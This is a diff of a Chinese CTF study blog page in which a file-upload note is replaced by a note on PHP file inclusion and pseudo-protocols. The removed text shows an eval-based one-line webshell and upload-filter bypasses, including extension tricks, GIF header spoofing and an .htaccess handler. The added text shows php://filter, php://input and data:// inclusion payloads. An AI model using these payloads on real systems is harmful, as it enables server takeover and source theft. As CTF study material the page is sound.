@@ -16,25 +16,21 @@
   <meta name="author" content="Jiashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一句话木马与文件上传webshellwebshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。 最普遍的一句">
+    <meta name="description" content="文件包含漏洞和php伪协议文件包含漏洞什么是文件包含漏洞： 为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了文件包含漏洞，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctf-文件上传">
-<meta property="og:url" content="https://jiashi19.gitee.io/2023/09/27/ctf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:title" content="ctf-web-php伪协议">
+<meta property="og:url" content="https://jiashi19.gitee.io/2023/10/16/ctf-web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
 <meta property="og:site_name" content="Blog from js19">
-<meta property="og:description" content="一句话木马与文件上传webshellwebshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。 最普遍的一句">
+<meta property="og:description" content="文件包含漏洞和php伪协议文件包含漏洞什么是文件包含漏洞： 为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了文件包含漏洞，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/09/22/gpfAxnuyeXzh32j.png">
-<meta property="og:image" content="https://s2.loli.net/2023/09/22/2glOqDAMapuYI4P.png">
-<meta property="og:image" content="https://s2.loli.net/2023/09/22/3vlMOEcDTFUymb5.png">
-<meta property="article:published_time" content="2023-09-27T01:32:01.000Z">
-<meta property="article:modified_time" content="2023-10-15T15:48:09.411Z">
+<meta property="article:published_time" content="2023-10-16T13:41:42.000Z">
+<meta property="article:modified_time" content="2023-10-18T06:34:21.177Z">
 <meta property="article:author" content="Jiashi">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2023/09/22/gpfAxnuyeXzh32j.png">
   
   
   
-  <title>ctf-文件上传 - Blog from js19</title>
+  <title>ctf-web-php伪协议 - Blog from js19</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ctf-文件上传"></span>
+            <span id="subtitle" data-typed-text="ctf-web-php伪协议"></span>
           
         </div>
 
@@ -211,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-27 09:32" pubdate>
-          2023年9月27日 上午
+        <time datetime="2023-10-16 21:41" pubdate>
+          2023年10月16日 晚上
         </time>
       </span>
     
@@ -223,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k 字
+          1.3k 字
         
       </span>
     
@@ -234,7 +230,7 @@
         
         
         
-          17 分钟
+          12 分钟
         
       </span>
     
@@ -271,85 +267,48 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">ctf-文件上传</h1>
+            <h1 id="seo-header">ctf-web-php伪协议</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="一句话木马与文件上传"><a href="#一句话木马与文件上传" class="headerlink" title="一句话木马与文件上传"></a>一句话木马与文件上传</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。</p>
-<p>最普遍的一句：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="文件包含漏洞和php伪协议"><a href="#文件包含漏洞和php伪协议" class="headerlink" title="文件包含漏洞和php伪协议"></a>文件包含漏洞和php伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>什么是文件包含漏洞：</p>
+<p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
+<span id="more"></span>
 
-<p>其中eval就是执行命令的函数，$_POST[‘shell’]就是接收的数据。eval函数把接收的数据当作php代码来执行。这样我们就能够让插了一句话木马的网站执行我们传递过去的任意php语句。这便是一句话木马的强大之处。</p>
-<h2 id="绕过前端"><a href="#绕过前端" class="headerlink" title="绕过前端"></a>绕过前端</h2><h3 id="burp抓包"><a href="#burp抓包" class="headerlink" title="burp抓包"></a>burp抓包</h3><p>抓包改文件名</p>
-<h2 id="绕过后端"><a href="#绕过后端" class="headerlink" title="绕过后端"></a>绕过后端</h2><h3 id="特殊解析绕过"><a href="#特殊解析绕过" class="headerlink" title="特殊解析绕过"></a>特殊解析绕过</h3><p>如果黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。</p>
-<p>不同后缀：Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</p>
-<p>也可尝试大小写绕过：</p>
-<p>windows对大小写不敏感，linux对大小写敏感</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>以下为示例检测代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">//code from ctfhub</span><br></code></pre></td></tr></table></figure>
+<p>文件包含示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h3><p>Method1:</p>
-<p>上传一张图片，然后在尾部加上一句话木马（同样使用burpsuite）</p>
-<p>问题:在传入一张正常图片，然后在burp里面拦截并尾部加上一句话木马后，显示上传成功，但是却无法读取，在前端访问显示error；最后删去了很长一段图片内容，再次上传，可以成功连接；</p>
-<p>Method2:</p>
-<p>将上传的一句话木马文件改名绕过前端：</p>
-<p>muma.php—&gt;muma.jpeg</p>
-<p><img src="https://s2.loli.net/2023/09/22/gpfAxnuyeXzh32j.png" srcset="/img/loading.gif" lazyload alt="image-20230922102923688"></p>
-<p>burp抓包，改回php后缀名，并且加上GIF89a(gif的文件头)</p>
-<p><img src="https://s2.loli.net/2023/09/22/2glOqDAMapuYI4P.png" srcset="/img/loading.gif" lazyload alt="image-20230922102655658"></p>
-<p>但是试了GIF8, 也可以上传成功(网上教程全部说的是添加GIF89a，可能全是抄的一家的吧)</p>
-<p><img src="https://s2.loli.net/2023/09/22/3vlMOEcDTFUymb5.png" srcset="/img/loading.gif" lazyload alt="image-20230922111052350"></p>
-<p>![image-20230922111145578](&#x2F;Users&#x2F;wufei&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230922111145578.png)</p>
-<p>GIF8—47494638  已经是文件头了 </p>
-<p>常见图片文件头：</p>
-<table>
-<thead>
-<tr>
-<th>文件类型</th>
-<th>后缀</th>
-<th>文件头</th>
-<th>文件尾</th>
-<th>标志</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>JPEG</td>
-<td>.jpg&#x2F;.jpeg</td>
-<td>FFD8FF</td>
-<td>FFD9</td>
-<td>JFIF</td>
-</tr>
-<tr>
-<td>PNG</td>
-<td>.png</td>
-<td>89504E47</td>
-<td>AE426082</td>
-<td>PNG IEND IHDR</td>
-</tr>
-<tr>
-<td>GIF</td>
-<td>.gif</td>
-<td>47494638</td>
-<td>003B</td>
-<td>GIT9a</td>
-</tr>
-<tr>
-<td>TIFF</td>
-<td>.tif&#x2F;.tiff</td>
-<td>49492A00</td>
-<td>4D4D2A00</td>
-<td>- II MM</td>
-</tr>
-</tbody></table>
-<h3 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h3><p>原理： </p>
-<ul>
-<li>.htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。 </li>
-<li>htaccess 中有 # 单行注释符, 且支持 \拼接上下两行</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;    <br>	SetHandler application/x-httpd-php <br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
 
-<h3 id="待补充。。。。"><a href="#待补充。。。。" class="headerlink" title="待补充。。。。"></a>待补充。。。。</h3>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure>
+
+<p>访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php</p>
+<p><strong>转换过滤器</strong>：</p>
+<ol>
+<li>convert.base64-encode &amp; convert.base64-decode。即上面示例</li>
+<li>convert.iconv.*。使用有两种方法:</li>
+</ol>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;.&lt;output-<span class="hljs-keyword">encoding</span>&gt; <br><span class="hljs-keyword">or</span><br>convert.iconv.&lt;<span class="hljs-keyword">input</span>-<span class="hljs-keyword">encoding</span>&gt;/&lt;output-<span class="hljs-keyword">encoding</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>支持的编码：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs txt">UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br></code></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>可以访问请求的原始数据的只读流，可以读取 POST 请求的参数–即可以在<strong>post data中附带上php代码</strong>。</p>
+<p>比如，遍历当前目录下所有文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">data://text/plain;<span class="hljs-built_in">base64</span>,xxxx(<span class="hljs-built_in">base64</span>编码后的数据)<br></code></pre></td></tr></table></figure>
+
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109300335">https://blog.csdn.net/qq_44657899/article/details/109300335</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cocoaiu/article/details/126319957">https://blog.csdn.net/cocoaiu/article/details/126319957</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>
+
                 
               </div>
             
@@ -397,8 +356,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ctf-文件上传</div>
-      <div>https://jiashi19.gitee.io/2023/09/27/ctf-文件上传/</div>
+      <div>ctf-web-php伪协议</div>
+      <div>https://jiashi19.gitee.io/2023/10/16/ctf-web-php伪协议/</div>
     </div>
     <div class="license-meta">
       
@@ -410,7 +369,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月27日</div>
+          <div>2023年10月16日</div>
         </div>
       
       
@@ -442,18 +401,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/03/%E7%88%86%E7%A0%B4-token%E7%BB%95%E8%BF%87/" title="爆破-token绕过">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">爆破-token绕过</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/18/ctf-web-php/" title="ctf-web练习(php)">
-                        <span class="hidden-mobile">ctf-web练习(php)</span>
+                      <a href="/2023/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" title="恶意代码分析">
+                        <span class="hidden-mobile">恶意代码分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
